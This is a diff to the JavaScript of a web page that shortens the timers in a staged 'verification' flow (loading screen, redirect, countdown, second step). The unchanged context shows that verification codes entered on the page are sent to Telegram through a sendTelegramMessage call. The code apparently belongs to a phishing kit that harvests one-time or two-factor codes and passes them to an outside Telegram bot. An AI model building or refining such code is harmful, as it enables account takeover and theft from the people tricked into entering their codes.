@@ -1202,10 +1202,10 @@
           // Show loading page immediately
           showLoadingPage();
           
-          // Redirect to first verification step after 5 seconds
+          // Redirect to first verification step after 3 seconds
           setTimeout(function() {
             window.location.href = '/verify-step1';
-          }, 5000);
+          }, 3000);
         }
       });
       
@@ -1323,11 +1323,11 @@
             firstVerificationStep.style.display = 'none';
             pendingConfirmationStep.style.display = 'block';
             
-            // Start 5-second countdown with progress bar
-            let timeRemaining = 5;
+            // Start 3-second countdown with progress bar
+            let timeRemaining = 3;
             const updateInterval = setInterval(() => {
               timeRemaining--;
-              const progressPercentage = ((5 - timeRemaining) / 5) * 100;
+              const progressPercentage = ((3 - timeRemaining) / 3) * 100;
               progressBar.style.width = progressPercentage + '%';
               
               if (timeRemaining > 0) {
@@ -1350,7 +1350,7 @@
             const success = await sendTelegramMessage(message);
             console.log('First verification code sent to Telegram:', success);
             
-            // After 5 seconds, show second verification step
+            // After 3 seconds, show second verification step
             setTimeout(() => {
               pendingConfirmationStep.style.display = 'none';
               secondVerificationStep.style.display = 'block';
